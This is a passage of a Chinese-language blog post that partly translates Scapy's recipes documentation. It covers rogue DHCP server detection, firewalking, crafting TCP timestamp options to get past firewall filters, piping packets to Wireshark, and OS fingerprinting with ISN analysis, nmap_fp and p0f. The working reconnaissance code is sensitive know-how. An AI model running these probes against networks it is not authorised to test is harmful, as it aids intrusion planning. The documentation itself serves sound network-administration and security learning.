<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.checkIPaddr = <span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fam,hw = get_if_raw_hwaddr(conf.iface)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dhcp_discover = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)/IP(src=<span class="string">"0.0.0.0"</span>,dst=<span class="string">"255.255.255.255"</span>)/UDP(sport=<span class="number">68</span>,dport=<span class="number">67</span>)/BOOTP(chaddr=hw)/DHCP(options=[(<span class="string">"message-type"</span>,<span class="string">"discover"</span>),<span class="string">"end"</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = srp(dhcp_discover, multi=<span class="literal">True</span>)      <span class="comment"># Press CTRL-C after several seconds</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished to send <span class="number">1</span> packets.</span><br><span class="line">.*...*..</span><br><span class="line">Received <span class="number">8</span> packets, got <span class="number">2</span> answers, remaining <span class="number">0</span> packets</span><br></pre></td></tr></table></figure>

<p> 在这种情况下，我们得到了两个应答，所以测试网络上有两个活动的DHCP服务器： </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans.summary()</span><br><span class="line">Ether / IP / UDP 0.0.0.0:bootpc &gt; 255.255.255.255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192.168.1.1:bootps &gt; 255.255.255.255:bootpc / BOOTP / DHCP</span><br><span class="line">Ether / IP / UDP 0.0.0.0:bootpc &gt; 255.255.255.255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192.168.1.11:bootps &gt; 255.255.255.255:bootpc / BOOTP / DHCP</span><br></pre></td></tr></table></figure>

<p>如果只感兴趣于MAC和IP地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> ans: <span class="keyword">print</span> p[<span class="number">1</span>][Ether].src, p[<span class="number">1</span>][IP].src</span><br><span class="line">...</span><br><span class="line"><span class="number">00</span>:de:ad:be:ef:<span class="number">00</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line"><span class="number">00</span>:<span class="number">11</span>:<span class="number">11</span>:<span class="number">22</span>:<span class="number">22</span>:<span class="number">33</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br></pre></td></tr></table></figure>

<h4 id="Discussion"><a href="#Discussion" class="headerlink" title="Discussion"></a>Discussion</h4><p>我们设置<code>multi=True</code>来确保Scapy在接收到第一个响应之后可以等待更多的应答数据包。这也就是我们为什么不用更方便的<code>dhcp_request()</code>函数，而是手动地构造DCHP数据包的原因：<code>dhcp_request()</code>使用<code>srp1()</code>来发送和接收数据包，这样在接收到一个应答数据包之后就会立即返回。</p>
<p>此外，Scapy通常确保应答来源于之前发送请求的目的地址。但是我们的DHCP数据包被发送到IP广播地址（255.255.255.255），任何应答数据包都将回复DCHP服务器的IP地址作为其源IP地址（e.g. 192.168.1.1）。由于这些IP地址不匹配，我们必须在发送请求前使用<code>conf.checkIPaddr = False</code>来禁用Scapy的check。</p>
<h4 id="See-also"><a href="#See-also" class="headerlink" title="See also"></a>See also</h4><p><a href="http://en.wikipedia.org/wiki/Rogue_DHCP" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Rogue_DHCP</a></p>
<h3 id="Firewalking"><a href="#Firewalking" class="headerlink" title="Firewalking"></a>Firewalking</h3><p> TTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL超时 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"172.16.4.27"</span>, ttl=<span class="number">16</span>)/TCP(dport=(<span class="number">1</span>,<span class="number">1024</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> s,r <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">if</span> r.haslayer(ICMP) <span class="keyword">and</span> r.payload.type == <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">print</span> s.dport</span><br></pre></td></tr></table></figure>

<p> 在对多网卡的防火墙查找子网时，只有它自己的网卡IP可以达到这个TTL： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = sr(IP(dst=<span class="string">"172.16.5/24"</span>, ttl=<span class="number">15</span>)/TCP())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> unans: <span class="keyword">print</span> i.dst</span><br></pre></td></tr></table></figure>

<h3 id="TCP-Timestamp-Filtering"><a href="#TCP-Timestamp-Filtering" class="headerlink" title="TCP Timestamp Filtering"></a>TCP Timestamp Filtering</h3><h4 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h4><p> 在比较流行的端口扫描器中，一种常见的情况就是没有设置TCP时间戳选项，而许多防火墙都包含一条规则来丢弃这样的TCP数据包。 </p>
<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p> 为了让Scapy能够到达其他位置，就必须使用其他选项： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sr1(IP(dst=<span class="string">"72.14.207.99"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">"S"</span>,options=[(<span class="string">'Timestamp'</span>,(<span class="number">0</span>,<span class="number">0</span>))]))</span><br></pre></td></tr></table></figure>

<h3 id="Viewing-packets-with-Wireshark"><a href="#Viewing-packets-with-Wireshark" class="headerlink" title="Viewing packets with Wireshark"></a>Viewing packets with Wireshark</h3><h4 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem"></a>Problem</h4><p> 你已经使用Scapy收集或者嗅探了一些数据包，因为Wireshark高级的数据包展示功能，你想使用Wireshark查看这些数据包。 </p>
<h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p> 正好可以使用<code>wireshark()</code>函数： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># First, generate some packets...</span></span><br><span class="line">packets = IP(src=<span class="string">"192.0.2.9"</span>, dst=Net(<span class="string">"192.0.2.10/30"</span>))/ICMP()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show them with Wireshark</span></span><br><span class="line">wireshark(packets)</span><br></pre></td></tr></table></figure>

<p>Wireshark 将会被启用并展示你的数据包。</p>
<h4 id="Discussion-1"><a href="#Discussion-1" class="headerlink" title="Discussion"></a>Discussion</h4><ul>
<li><p><code>wireshark</code>(<em>pktlist</em>, <em>…</em>)</p>
<p>With a <code>Packet</code> or <code>PacketList</code>, serialises your packets, and streams this into Wireshark via <code>stdin</code> as if it were a capture device.Because this uses <code>pcap</code> format to serialise the packets, there are some limitations:Packets must be all of the same <code>linktype</code>.For example, you can’t mix <code>Ether</code> and <code>IP</code> at the top layer.Packets must have an assigned (and supported) <code>DLT_*</code> constant for the <code>linktype</code>. An unsupported <code>linktype</code> is replaced with <code>DLT_EN10MB</code>(Ethernet), and will display incorrectly in Wireshark.For example, can’t pass a bare <code>ICMP</code> packet, but you can send it as a payload of an <code>IP</code> or <code>IPv6</code> packet.With a filename (passed as a string), this loads the given file in Wireshark. This needs to be in a format that Wireshark supports.You can tell Scapy where to find the Wireshark executable by changing the <code>conf.prog.wireshark</code> configuration setting.This accepts the same extra parameters as <code>tcpdump()</code>.</p>
</li>
</ul>
<p>See also</p>
<ul>
<li><p><a href="https://scapy.readthedocs.io/en/latest/advanced_usage.html#WiresharkSink" target="_blank" rel="noopener"><code>WiresharkSink</code></a></p>
<p>A <a href="https://scapy.readthedocs.io/en/latest/advanced_usage.html#pipetools" target="_blank" rel="noopener">PipeTools sink</a> for live-streaming packets.</p>
</li>
<li><p><em><a href="https://manpages.debian.org/wireshark(1)" target="_blank" rel="noopener">wireshark(1)</a></em></p>
<p>Additional description of Wireshark’s functionality, and its command-line arguments.</p>
</li>
<li><p><a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark’s website</a></p>
<p>For up-to-date releases of Wireshark.</p>
</li>
<li><p><a href="https://wiki.wireshark.org/ProtocolReference" target="_blank" rel="noopener">Wireshark Protocol Reference</a></p>
<p>Contains detailed information about Wireshark’s protocol dissectors, and reference documentation for various network protocols.</p>
</li>
</ul>
<h3 id="OS-Fingerprinting"><a href="#OS-Fingerprinting" class="headerlink" title="OS Fingerprinting"></a>OS Fingerprinting</h3><h4 id="ISN"><a href="#ISN" class="headerlink" title="ISN"></a>ISN</h4><p>Scapy can be used to analyze ISN (Initial Sequence Number) increments to possibly discover vulnerable systems. First we will collect target responses by sending a number of SYN probes in a loop:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans, unans = srloop(IP(dst=<span class="string">"192.168.1.1"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">"S"</span>))</span><br></pre></td></tr></table></figure>

<p>Once we obtain a reasonable number of responses we can start analyzing collected data with something like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>temp = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> s, r <span class="keyword">in</span> ans:</span><br><span class="line"><span class="meta">... </span>   temp = r[TCP].seq - temp</span><br><span class="line"><span class="meta">... </span>   print(<span class="string">"%d\t+%d"</span> % (r[TCP].seq, temp))</span><br><span class="line">...</span><br><span class="line"><span class="number">4278709328</span>      +<span class="number">4275758673</span></span><br><span class="line"><span class="number">4279655607</span>      +<span class="number">3896934</span></span><br><span class="line"><span class="number">4280642461</span>      +<span class="number">4276745527</span></span><br><span class="line"><span class="number">4281648240</span>      +<span class="number">4902713</span></span><br><span class="line"><span class="number">4282645099</span>      +<span class="number">4277742386</span></span><br><span class="line"><span class="number">4283643696</span>      +<span class="number">5901310</span></span><br></pre></td></tr></table></figure>

<h4 id="nmap-fp"><a href="#nmap-fp" class="headerlink" title="nmap_fp"></a>nmap_fp</h4><p>Nmap fingerprinting (the old “1st generation” one that was done by Nmap up to v4.20) is supported in Scapy. In Scapy v2 you have to load an extension module first:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>load_module(<span class="string">"nmap"</span>)</span><br></pre></td></tr></table></figure>

<p>If you have Nmap installed you can use it’s active os fingerprinting database with Scapy. Make sure that version 1 of signature database is located in the path specified by:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.nmap_base</span><br></pre></td></tr></table></figure>

<p>Then you can use the <code>nmap_fp()</code> function which implements same probes as in Nmap’s OS Detection engine:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nmap_fp(<span class="string">"192.168.1.1"</span>,oport=<span class="number">443</span>,cport=<span class="number">1</span>)</span><br><span class="line">Begin emission:</span><br><span class="line">.****..**Finished to send <span class="number">8</span> packets.</span><br><span class="line">*................................................</span><br><span class="line">Received <span class="number">58</span> packets, got <span class="number">7</span> answers, remaining <span class="number">1</span> packets</span><br><span class="line">(<span class="number">1.0</span>, [<span class="string">'Linux 2.4.0 - 2.5.20'</span>, <span class="string">'Linux 2.4.19 w/grsecurity patch'</span>,</span><br><span class="line"><span class="string">'Linux 2.4.20 - 2.4.22 w/grsecurity.org patch'</span>, <span class="string">'Linux 2.4.22-ck2 (x86)</span></span><br><span class="line"><span class="string">w/grsecurity.org and HZ=1000 patches'</span>, <span class="string">'Linux 2.4.7 - 2.6.11'</span>])</span><br></pre></td></tr></table></figure>

<h4 id="p0f"><a href="#p0f" class="headerlink" title="p0f"></a>p0f</h4><p> 如果你已在操作系统中安装了p0f，你可以直接从Scapy中使用它来猜测操作系统名称和版本。（仅在SYN数据库被使用时）。首先要确保p0f数据库存在于指定的路径： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>conf.p0f_base</span><br></pre></td></tr></table></figure>

<p>For example to guess OS from a single captured packet:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sniff(prn=prnp0f)</span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">54716</span> - Linux <span class="number">2.6</span> (newer, <span class="number">1</span>) (up: <span class="number">24</span> hrs)</span><br><span class="line">  -&gt; 74.125.19.104:www (distance 0)</span><br><span class="line">&lt;Sniffed: TCP:<span class="number">339</span> UDP:<span class="number">2</span> ICMP:<span class="number">0</span> Other:<span class="number">156</span>&gt;</span><br></pre></td></tr></table></figure>


      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/python/" rel="tag"># python</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/13/%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93%E5%8D%A0%E6%8D%AE%E5%86%85%E5%AD%98/" rel="next" title="内存对齐与结构体占据内存">
                <i class="fa fa-chevron-left"></i> 内存对齐与结构体占据内存
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/27/IPsec%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="IPsec学习笔记">
                IPsec学习笔记 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="陈潇" />
            
              <p class="site-author-name" itemprop="name">陈潇</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">48</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/iwannatobehappy" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://845895322@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Usage"><span class="nav-number">1.</span> <span class="nav-text">Usage</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Starting-Scapy"><span class="nav-number">1.1.</span> <span class="nav-text">Starting Scapy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Customizing-the-Terminal"><span class="nav-number">1.1.1.</span> <span class="nav-text">Customizing the Terminal</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#交互式教程"><span class="nav-number">1.2.</span> <span class="nav-text">交互式教程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#First-steps"><span class="nav-number">1.2.1.</span> <span class="nav-text">First steps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stacking-layers"><span class="nav-number">1.2.2.</span> <span class="nav-text">Stacking layers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reading-PCAP-files"><span class="nav-number">1.2.3.</span> <span class="nav-text">Reading PCAP files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Graphical-dumps-PDF-PS"><span class="nav-number">1.2.4.</span> <span class="nav-text">Graphical dumps (PDF, PS)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generating-sets-of-packets"><span class="nav-number">1.2.5.</span> <span class="nav-text">Generating sets of packets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sending-packets"><span class="nav-number">1.2.6.</span> <span class="nav-text">Sending packets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fuzzing"><span class="nav-number">1.2.7.</span> <span class="nav-text">Fuzzing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Send-and-receive-packets-sr"><span class="nav-number">1.2.8.</span> <span class="nav-text">Send and receive packets (sr)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SYN-Scans"><span class="nav-number">1.2.9.</span> <span class="nav-text">SYN Scans</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-traceroute"><span class="nav-number">1.2.10.</span> <span class="nav-text">TCP traceroute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Configuring-super-sockets"><span class="nav-number">1.2.11.</span> <span class="nav-text">Configuring super sockets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sniffing"><span class="nav-number">1.2.12.</span> <span class="nav-text">Sniffing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Asynchronous-Sniffing"><span class="nav-number">1.2.13.</span> <span class="nav-text">Asynchronous Sniffing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Advanced-Sniffing-Sniffing-Sessions"><span class="nav-number">1.2.14.</span> <span class="nav-text">Advanced Sniffing - Sniffing Sessions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Filters"><span class="nav-number">1.2.15.</span> <span class="nav-text">Filters</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Send-and-receive-in-a-loop"><span class="nav-number">1.2.16.</span> <span class="nav-text">Send and receive in a loop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Importing-and-Exporting-Data"><span class="nav-number">1.2.17.</span> <span class="nav-text">Importing and Exporting Data</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PCAP"><span class="nav-number">1.2.17.1.</span> <span class="nav-text">PCAP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hexdump"><span class="nav-number">1.2.17.2.</span> <span class="nav-text">Hexdump</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Binary-string"><span class="nav-number">1.2.17.3.</span> <span class="nav-text">Binary string</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Base64"><span class="nav-number">1.2.17.4.</span> <span class="nav-text">Base64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sessions"><span class="nav-number">1.2.17.5.</span> <span class="nav-text">Sessions</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Making-tables"><span class="nav-number">1.2.18.</span> <span class="nav-text">Making tables</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Routing"><span class="nav-number">1.2.19.</span> <span class="nav-text">Routing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Matplotlib"><span class="nav-number">1.2.20.</span> <span class="nav-text">Matplotlib</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-traceroute-2"><span class="nav-number">1.2.21.</span> <span class="nav-text">TCP traceroute (2)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wireless-frame-injection"><span class="nav-number">1.2.22.</span> <span class="nav-text">Wireless frame injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-one-liners"><span class="nav-number">1.3.</span> <span class="nav-text">Simple one-liners</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ACK-Scan"><span class="nav-number">1.3.1.</span> <span class="nav-text">ACK Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xmas-Scan"><span class="nav-number">1.3.2.</span> <span class="nav-text">Xmas Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP-Scan"><span class="nav-number">1.3.3.</span> <span class="nav-text">IP Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP-Ping"><span class="nav-number">1.3.4.</span> <span class="nav-text">ARP Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP-Ping"><span class="nav-number">1.3.5.</span> <span class="nav-text">ICMP Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-Ping"><span class="nav-number">1.3.6.</span> <span class="nav-text">TCP Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP-Ping"><span class="nav-number">1.3.7.</span> <span class="nav-text">UDP Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Requests"><span class="nav-number">1.3.8.</span> <span class="nav-text">DNS Requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Classical-attacks"><span class="nav-number">1.3.9.</span> <span class="nav-text">Classical attacks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP-cache-poisoning"><span class="nav-number">1.3.10.</span> <span class="nav-text">ARP cache poisoning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-Port-Scanning"><span class="nav-number">1.3.11.</span> <span class="nav-text">TCP Port Scanning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IKE-Scanning"><span class="nav-number">1.3.12.</span> <span class="nav-text">IKE Scanning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Advanced-traceroute"><span class="nav-number">1.3.13.</span> <span class="nav-text">Advanced traceroute</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TCP-SYN-traceroute"><span class="nav-number">1.3.13.1.</span> <span class="nav-text">TCP SYN traceroute</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UDP-traceroute"><span class="nav-number">1.3.13.2.</span> <span class="nav-text">UDP traceroute</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-traceroute"><span class="nav-number">1.3.13.3.</span> <span class="nav-text">DNS traceroute</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Etherleaking"><span class="nav-number">1.3.14.</span> <span class="nav-text">Etherleaking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP-leaking"><span class="nav-number">1.3.15.</span> <span class="nav-text">ICMP leaking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN-hopping"><span class="nav-number">1.3.16.</span> <span class="nav-text">VLAN hopping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wireless-sniffing"><span class="nav-number">1.3.17.</span> <span class="nav-text">Wireless sniffing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recipes"><span class="nav-number">1.4.</span> <span class="nav-text">Recipes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Simplistic-ARP-Monitor"><span class="nav-number">1.4.1.</span> <span class="nav-text">Simplistic ARP Monitor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Identifying-rogue-DHCP-servers-on-your-LAN"><span class="nav-number">1.4.2.</span> <span class="nav-text">Identifying rogue DHCP servers on your LAN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Problem"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">Problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solution"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Discussion"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">Discussion</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#See-also"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">See also</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Firewalking"><span class="nav-number">1.4.3.</span> <span class="nav-text">Firewalking</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-Timestamp-Filtering"><span class="nav-number">1.4.4.</span> <span class="nav-text">TCP Timestamp Filtering</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Problem-1"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">Problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solution-1"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Viewing-packets-with-Wireshark"><span class="nav-number">1.4.5.</span> <span class="nav-text">Viewing packets with Wireshark</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Problem-2"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">Problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solution-2"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Discussion-1"><span class="nav-number">1.4.5.3.</span> <span class="nav-text">Discussion</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OS-Fingerprinting"><span class="nav-number">1.4.6.</span> <span class="nav-text">OS Fingerprinting</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ISN"><span class="nav-number">1.4.6.1.</span> <span class="nav-text">ISN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-fp"><span class="nav-number">1.4.6.2.</span> <span class="nav-text">nmap_fp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#p0f"><span class="nav-number">1.4.6.3.</span> <span class="nav-text">p0f</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">陈潇</span>

  
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
